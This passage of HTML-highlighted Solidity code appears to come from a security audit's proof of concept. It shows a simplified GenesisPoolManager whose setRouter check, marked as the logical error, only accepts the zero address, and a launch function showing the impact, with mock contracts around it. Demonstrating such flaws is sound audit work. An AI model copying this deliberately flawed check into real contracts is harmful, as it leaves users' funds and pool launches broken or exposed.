class=\"mtk3\"\u003e// Simulate interaction with the router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetLiquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A simplified GenesisPoolManager containing the vulnerable function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// and a conceptual _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The vulnerable state variable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added for _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;     \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added for _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eevent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRouterSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emodifier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003econstructor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweeks\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The vulnerable function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The logical error\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRouterSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Conceptual launch pool function to demonstrate impact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// In a real scenario, _genesisPool would be a parameter or fetched\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_launchPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Simplified steps from the actual GenesisPoolManager._launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Assume liquidityPoolInfo.pairAddress and liquidityPoolInfo.gaugeAddress are set on _genesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// IBaseV1Factory(pairFactory).setGenesisStatus(IGenesisPool(_genesisPool).getLiquidityPoolInfo().pairAddress, false); // Simplified\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// IGauge(IGenesisPool(_genesisPool).getLiquidityPoolInfo().gaugeAddress).setGenesisPool(address(_genesisPool)); // Simplified\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will use the (potentially zero) router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Public wrapper for testing _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_launchPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Mock for IBaseV1Factory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Dummy implementations for other functions if needed by compiler for interface\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan 